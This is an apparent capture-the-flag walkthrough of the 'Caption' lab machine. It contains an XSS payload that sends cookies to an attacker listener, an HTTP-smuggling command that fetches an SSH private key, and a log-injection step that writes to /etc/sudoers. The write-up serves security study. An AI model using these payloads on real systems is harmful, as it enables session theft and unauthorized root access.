Walkthrough of Caption (Dec-27-2024)
(Post the unintenional route fix, I skip all the uneeded things I did)

We start of by running an nmap scan on `10.10.11.33`. The scan shows port 8080 open. Navigating on caption.htb:8080, we see a GitBucket service, and we are able to access the commits made by root.
On one of the commits, we can see hard-coded credentials for the user `margo`. Going back to the main website on caption.htb, we can log in with those credentials.

#Getting the admin cookie

The exploit is on the /firewalls page. I used Burspuite to execute it. We start of by fuzzing for potential headers, and we found that the header X-Forwarded-Host returns a different response, thus making it
vulenrable. Upon testing for XSS, we find out that it is vulnerable to it. The exploit is found at the `utm_source?url=...` that we can see in the Burpsuite response. If we open a Python HTTP Server, we see that
it successfully reaches back to us, so now we can craft a payload that returns the admin cookie.

This is the payload.js:
```
async function getData() {
        var string = document.cookie;
        var encodedString = btoa(string);
        var url = 'http://10.10.16.37/hello?str=' + encodedString
        fetch(url).then(function(response) {
                return;
        }).catch(function(err) {
                return;
        });
}

getData();
```

Then we do `cat payload.js | base64 | tr -d '\n'; echo` to convert it to base64, and it should be something like that:
```
YXN5bmMgZnVuY3Rpb24gZ2V0RGF0YSgpIHsKCXZhciBzdHJpbmcgPSBkb2N1bWVudC5jb29raWU7Cgl2YXIgZW5jb2RlZFN0cmluZyA9IGJ0b2Eoc3RyaW5nKTsKCXZhciB1cmwgPSAnaHR0cDovLzEwLjEwLjE2LjM3L2hlbGxvP3N0cj0nICsgZW5jb2RlZFN0cmluZwoJZmV0Y2godXJsKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKSB7CgkJcmV0dXJuOwoJfSkuY2F0Y2goZnVuY3Rpb24oZXJyKSB7CgkJcmV0dXJuOwoJfSk7Cn0KCmdldERhdGEoKTsK
```

The exploit should look something like this:
```
X-FORWARDED-HOST: "></script><script>eval(atob(/YXN5bmMgZnVuY3Rpb24gZ2V0RGF0YSgpIHsKCXZhciBzdHJpbmcgPSBkb2N1bWVudC5jb29raWU7Cgl2YXIgZW5jb2RlZFN0cmluZyA9IGJ0b2Eoc3RyaW5nKTsKCXZhciB1cmwgPSAnaHR0cDovLzEwLjEwLjE2LjYxOjgwL2hlbGxvP3N0cj0nICsgZW5jb2RlZFN0cmluZwoJZmV0Y2godXJsKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKSB7CgkJcmV0dXJuOwoJfSkuY2F0Y2goZnVuY3Rpb24oZXJyKSB7CgkJcmV0dXJuOwoJfSk7Cn0KCmdldERhdGEoKTsK/.source));</script><script src="
```
If we start a local HTTP Server and refresh the page a couple of times, we get the admin cookie in base64 format and to decode it we run `echo "admin cookie" | base64 -d`

#HTTP smuggling

Logs are still not accessible, but it is hinted that we can perform HTTP smuggling in order to access it.
I used a Python tool called `h2csmuggler`. In the server, there is a .cpr directory. This directory holds an LFI exploit, and the paylod is as follows:
```
python3 h2csmuggler.py -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1MjE4NzUyfQ.d4-wtGXYkoY69q2ZsDfG0u5asuW35hH6d-rLuRW69Y0" -X GET -x http://caption.htb/ http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa
```
We can use this to download the `id_ecdsa` private key in order to log into margo with SSH.
```
chmod 600 id_ecdsa
ssh -i id_ecdsa margo@caption.htb
```
Now we can grab the user flag.

#Escalating to root

If we check on the GitBucket service again, we see a LogService repo, and if we check inside server.go we see a block of code that hints at command injection. The server executes as root logs. If we do
`ps aux | grep server.gp` we can see it's executed as root. With the help of our powerful tool ChatGPT and a couple other fellow users, I was able to craft the exploit to get root.
Below are the steps.
In the host PC:

```
cd /tmp
touch client.py
touch log_service.thrift
```
(sudo apt install thrift-compiler and also make a virtual env in python and install any needed packages)
client.py:
```py
import sys
sys.path.append('/tmp/gen-py')

from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService

# Create a connection to the Thrift service
transport = TSocket.TSocket("127.0.0.1", 9090)
transport = TTransport.TBufferedTransport(transport)
protocol = TBinaryProtocol.TBinaryProtocol(transport)
client = LogService.Client(protocol)

# Open the connection
transport.open()

# Call the vulnerable function
try:
    result = client.ReadLogFile("/tmp/malicious.log")
    print("Response from server:", result)
except Exception as e:
    print("Error:", e)

# Close the connection
transport.close()
```
log_service.thrift
```
namespace go log_service
namespace py log_service
     
service LogService {
    string ReadLogFile(1: string filePath)
}
```
In margo's /tmp directory inside a file called `malicious.log`:
`127.0.0.1, "user-agent":"Mozilla'; echo 'margo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers;#"`
That is then executed by the Python script. The log file adds the user `margo` to the /etc/sudoers file with no password, so now `margo` can do `sudo su` without
a password. Doing this switches the user to root, and then we can get the root flag.

Personal note: search for tools, in this case there was a tool `h2csmuggler` that another user told me I could take advantage of instead of manually doing the HTTP smuggling in Burpsuite.
